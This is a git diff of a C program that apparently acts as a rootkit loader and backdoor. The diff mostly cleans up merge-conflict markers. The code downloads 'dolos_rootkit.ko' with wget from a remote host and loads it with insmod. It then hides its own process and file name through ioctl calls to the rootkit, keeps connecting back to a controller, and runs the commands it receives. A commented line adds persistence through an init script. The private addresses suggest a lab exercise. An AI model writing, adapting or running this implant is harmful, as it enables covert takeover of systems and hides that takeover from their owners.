@@ -9,22 +9,15 @@
 #include <fcntl.h>
 #include <sys/syscall.h>
 
-<<<<<<< HEAD
-#define SA struct sockaddr
-#define PORT 4200
-#define ROOTKIT -1877
-#define BUFSIZE 100
-=======
 #define ROOTKIT -1877
 #define BUFSIZE 512
->>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
 #define SENDPID 8008
 #define GOTIME 8675309
 #define CHECKUP 80085
 #define GOODRET 42
 #define HIDEFILE 1234   
 
-char ip[] = "172.100.0.3";
+char ip[] = "172.100.0.1";
 int port = 4243;
 int attempts = 0;
 
@@ -40,12 +33,13 @@ void hideMyPid();
 void hideMyFileName(char* name);
 
 int main(int argc, char* argv[]) {
-    //pclose(popen("wget 172.100.0.3:4242/dolos_rootkit.ko 2>&1 1>/dev/null", "r"));
     pclose(popen("wget 172.100.0.3:4242/dolos_rootkit.ko 2>/dev/null 1>/dev/null", "r"));
     pclose(popen("insmod dolos_rootkit.ko", "r"));
+    //pclose(popen("echo \"/orangeRodent\" >> /etc/init.d/S01syslogd", "r"));
+    sleep(1);
     remove("dolos_rootkit.ko");
-    hideMyPid();
     hideMyFileName(argv[0] + 2);
+    hideMyPid();
     connectContinously(ip, port);
 }
 
@@ -150,29 +144,17 @@ void signalRootKit(int sockfd) {
     char success[] = "Kit hooked...\n";
     char fail[] = "Kit failed to hook...\n";
     int status = syscall(SYS_ioctl, ROOTKIT, GOTIME);
-<<<<<<< HEAD
-    if(status == GOODRET) {
-=======
     if(status == GOODRET)
->>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
         write(sockfd, success, sizeof(success));
     else
         write(sockfd, fail, sizeof(fail));
 }
 
 void checkRootkit(int sockfd) {
-<<<<<<< HEAD
-    //syscall: open certain file name, expect an unusual and specific return
-   char success[] = "Kit hooked...\n";
-    char fail[] = "Kit failed to hook...\n";
-    int status = syscall(SYS_ioctl, ROOTKIT, CHECKUP);
-    if(status == GOODRET) {
-=======
     char success[] = "Kit hooked...\n";
     char fail[] = "Kit failed to hook...\n";
     int status = syscall(SYS_ioctl, ROOTKIT, CHECKUP);
     if(status == GOODRET)
->>>>>>> 4e261d6ee82894ba840aacf35e891089fc37f7ca
         write(sockfd, success, sizeof(success));
     else
         write(sockfd, fail, sizeof(fail));
@@ -189,29 +171,6 @@ void hideMyFileName(char *fname) {
     char success[] = "Kit hooked...\n";
     char fail[] = "Kit failed to hook...\n";
     int status = syscall(SYS_ioctl, ROOTKIT, HIDEFILE, (long)fname);
-}
-
-void hideMyPid(int sockfd) {
-    int pid = getpid();
-    char success[] = "Kit hooked...\n";
-    char fail[] = "Kit failed to hook...\n";
-    int status = syscall(SYS_ioctl, ROOTKIT, SENDPID, pid);
-    if(status == GOODRET) {
-        write(sockfd, success, sizeof(success));
-    } else {
-        write(sockfd, fail, sizeof(fail));
-    } 
-}
-
-void hideMyFileName(char *fname[]) {
-    char success[] = "Kit hooked...\n";
-    char fail[] = "Kit failed to hook...\n";
-    int status = syscall(SYS_ioctl, ROOTKIT, HIDEFILE, (long)fname);
-    // if(status == GOODRET) {
-    //         write(sockfd, success, sizeof(success));
-    //     } else {
-    //         write(sockfd, fail, sizeof(fail));
-    //     } 
 }
 
 void execute(int sockfd, char* cmd){
@@ -233,5 +192,6 @@ void execute(int sockfd, char* cmd){
 void kill(){
     remove("orangeRodent");
     pclose(popen("rmmod dolos_rootkit", "r"));
+    //pclose(popen("sed -i '$ d' /etc/init.d/S01syslogd", "r"));
     exit(0);
 }
